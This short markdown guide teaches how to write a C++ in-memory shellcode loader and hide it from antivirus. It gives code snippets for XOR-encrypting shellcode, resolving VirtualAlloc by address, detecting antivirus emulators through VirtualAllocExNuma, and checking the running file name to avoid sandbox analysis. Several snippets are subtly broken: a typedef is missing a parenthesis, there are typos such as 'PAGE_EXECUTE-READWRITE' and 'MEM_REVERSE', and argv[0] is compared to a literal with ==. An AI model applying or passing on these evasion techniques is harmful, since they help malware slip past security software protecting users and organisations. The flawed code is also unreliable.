# Countering antivirus roadmap

Below I will outline several ways to write a shellcode loader in memory and how to hide it from antivirus on C++.

## Shellcode encryption
The simplest and most important way to hide the load is shellcode encryption , this will help bypass static analysis of your file.
You can use both simple xor and more complex encryption methods such as rc4 , etc .

for example:

```
  const char key[]="somekey";
  const char shellcode[]="some shellcode";
  
  char coded[sizeof(shellcode)];
  
  for (int i=0,j=0; i<sizeof(shellcode); i++,j++){
    if (!(j<sizeof(key))) {
    j=0;
    }
    coded[i] = shellcode[i] ^ key[j];
  }
```

## Using functions via address

You can use instead of a direct function call , a call through the address of this function in memory

for example:
```
  typedef LPVOID(__cdecl *MPROC)(LPVOID,SIZE_T,DWORD,DWORD;
  
  MPROC Alloc = (MPROC)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")),"VirtualAlloc");
  char *ex = (char*)Alloc(NULL,sizeof(shellcode),MEM_COMMIT,PAGE_EXECUTE-READWRITE);
```

## Result processing Windows API

The antivirus emulator may not handle all Windows API functions and returns by default Null

for example:
```
  LPVOID res = NULL;
  res = VirtualAllocExNuma(GetCurrentProcess(), NULL, 100, MEM_REVERSE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
  
  if (res != NULL )
  {
    //some code
  }
  return 0;
```
## Сhecking the process name

Antivirus during the binary file check can run it not with the original name, to bypass dynamic checking, you can check the name of the file being run.

for example:
```
 int main ( int argc, char* argv[])
 {
  if (argv[0] == "my_name.exe")
  {
    //exec shellcode
  } 
  return 0;
 } 
```
